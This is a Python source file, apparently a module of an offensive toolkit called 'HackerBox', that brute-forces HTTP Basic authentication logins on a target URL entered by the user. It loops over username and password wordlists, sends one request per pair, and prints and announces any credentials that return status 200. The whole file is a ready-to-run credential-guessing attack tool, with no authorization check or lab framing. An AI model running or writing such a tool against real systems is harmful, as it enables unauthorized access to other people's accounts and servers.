"""Bruteforce module for HackerBox."""

from pathlib import Path
from requests.auth import HTTPBasicAuth
from colorama import Fore

from config import DEFAULT_PASSLIST, DEFAULT_USERNAMES
from utils import make_request, show_progress_bar, show_notification, read_wordlist, logger

def bruteforcer() -> None:
    """Attempt to bruteforce login credentials for a target URL."""
    target = input("Enter target URL: ").strip()
    
    passlist_path = input("Enter path to passlist file (press enter to use Default): ").strip()
    passlist_file = Path(passlist_path) if passlist_path else DEFAULT_PASSLIST
    
    username_path = input("Enter username or path to username list (press enter to use Default): ").strip()
    username_file = Path(username_path) if username_path else DEFAULT_USERNAMES
    
    try:
        passwords = read_wordlist(passlist_file)
        usernames = read_wordlist(username_file) if username_path == "" else [username_path]
        
        show_progress_bar("Initializing bruteforce attack", 0.1)
        
        for username in usernames:
            for password in passwords:
                try:
                    response = make_request(target, auth=HTTPBasicAuth(username, password))
                    
                    if response.status_code == 401:
                        print(f"{Fore.RED}Login failed with {username}:{password}{Fore.RESET}")
                    elif response.status_code == 200:
                        message = f"Credentials found! {username}:{password}"
                        print(f"\n{'*' * 50}\n{message}\n{'*' * 50}")
                        show_notification(message)
                        return
                    else:
                        logger.warning(f"Unexpected status code {response.status_code} for {target}")
                        print(f"{Fore.YELLOW}Unexpected response: {response.status_code}{Fore.RESET}")
                        return
                        
                except Exception as e:
                    logger.error(f"Error during request: {e}")
                    print(f"{Fore.RED}Error: {e}{Fore.RESET}")
                    continue
                    
    except KeyboardInterrupt:
        logger.info("Bruteforce attack interrupted by user")
        print(f"\n{Fore.RED}Attack interrupted by user{Fore.RESET}")
    except Exception as e:
        logger.error(f"Error during bruteforce attack: {e}")
        print(f"\n{Fore.RED}Error: {e}{Fore.RESET}")
